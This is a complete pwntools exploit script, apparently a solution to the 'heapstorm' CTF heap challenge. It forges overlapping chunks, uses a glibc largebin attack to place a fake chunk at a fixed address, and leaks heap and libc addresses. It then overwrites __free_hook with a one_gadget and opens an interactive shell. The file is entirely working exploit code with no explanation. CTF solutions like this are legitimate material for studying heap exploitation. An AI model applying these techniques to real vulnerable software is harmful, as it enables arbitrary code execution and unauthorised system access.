from pwn import *
debug=1
#context.log_level = 'debug'
if debug:
    io = process('./heapstorm.dms')
else:
    io = remote("",1234)
elf = ELF('./heapstorm.dms')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
s       = lambda data               :io.send(data) 
sa      = lambda data1,data         :io.sendafter(data1, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda data1,data         :io.sendlineafter(data1, data)
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda data1, drop=True  :io.recvuntil(data1, drop)

def Allocate(a):
    ru('Command:')
    sl('1')
    ru('Size: ')
    sl(str(a))
def Update(a,b,c):
    ru('Command:')
    sl('2')
    ru('Index: ')
    sl(str(a))
    ru('Size: ')
    sl(str(b))
    ru('Content: ')
    s(c)
def Delete(a):
    ru('Command:')
    sl('3')
    ru('Index: ')
    sl(str(a))
def View(a):
    ru('Command:')
    sl('4')
    ru('Index: ')
    sl(str(a))
Allocate(0x90-8) #uns0
Allocate(0x520-8)#1
Allocate(0x90-8)#2
Allocate(0x20-8)#3
Allocate(0x90-8)#4
Allocate(0x520-8)#5
Allocate(0x90-8)#6
Allocate(0x20-8)#7
Allocate(0x410-8)#8
Allocate(0x20-8)#9
Allocate(0x410-8)#10

#fisrt overlap
Update(1,0x500,b"1"*(0x4f0)+p64(0x500)+p64(0xa1))
Delete(1)
Update(0,0x90-8-12,b"1"*(0x90-8-12))
Allocate(0x40-8)#1
Delete(1)
Delete(2)
Allocate(0x4c0-8)#1 in control
Allocate(0x5b0-8)#2
c=b"1"*(0x40-8)+p64(0x4c1)+b'1'*(0x4c0-8)+p64(23*16-0xc0+1)
Update(2,len(c),c)

#second overlap
Update(5,0x500,b"1"*(0x4f0)+p64(0x500)+p64(0xa1))
Delete(5)
Update(4,0x90-8-12,b"1"*(0x90-8-12))
Allocate(0x40-8)#5
Delete(5)
Delete(6)
Allocate(0x4c0-8)#5 in control
Allocate(0x5b0-8)#6
c=b"1"*(0x40-8)+p64(0x4c1)+b'1'*(0x4c0-8)+p64(23*16-0xc0+1)
Update(6,len(c),c)


#largebin attack -->fake chunk(0x133707f0)
Delete(1)
Allocate(0x600-8)#1 cosolidate
c=b"1"*(0x40-8)+p64(0x4c1)
c+=p64(0)
c+=p64(0x13370800-0x10+3-16)#size
c+=p64(0)
c+=p64(0x13370808-0x20)#bk
c+=b'1'*(0x4c0-8-16-16-8)+p64(0x4c0)+p64(23*16-0xc0)
Update(2,len(c),c)

#a bigger freed chunk in unsorted bin
#bk->fake chunk(0x133707f0)
Delete(5)
c=b"1"*(0x40-8)+p64(0x4d1)
c+=p64(0x0)
c+=p64(0x13370800-0x10)#bk
c+=b'1'*(0x4d0-8)+p64(0x4d0)+p64(23*16-0xc0-16)
Update(6,len(c),c)

#1.largebin attack ->fake chunk(0x133707f0) size=0x56
#2.alloc(0x133707f0)
Allocate(0x50-8)#5

c=p64(0)*3
c+=p64(0x13377331)
c+=p64(0x13370870)#0
c+=p64(0x100)
Update(5,len(c),c)

#leak libc
View(0)
ru(b"Chunk[0]: ")
rc=r(16)
heapbase=u64(rc[8:16])-0x778
log.success(hex(heapbase))

#leak heap
c=p64(0x13370800)#5
c+=p64(0x100)
c+=p64(heapbase+0x740)#6
c+=p64(0x500)
Update(0,len(c),c)
View(6)
ru(b"Chunk[6]: ")
rc=r(16)
libc.address=u64(rc[0:8])-3953032+1552
log.success(hex(libc.address))

#free_hook to shell
onegadgets=[0x45216,0x4526a,0xf02a4,0xf1147]
c=p64(0)*3
c+=p64(0x13377331)
c+=p64(libc.symbols['__free_hook'])#0
c+=p64(0x100)
c+=p64(heapbase+0x740)#6
c+=p64(0x500)
Update(5,len(c),c)
c=p64(libc.address+onegadgets[1])
Update(0,len(c),c)
Delete(1)
io.interactive()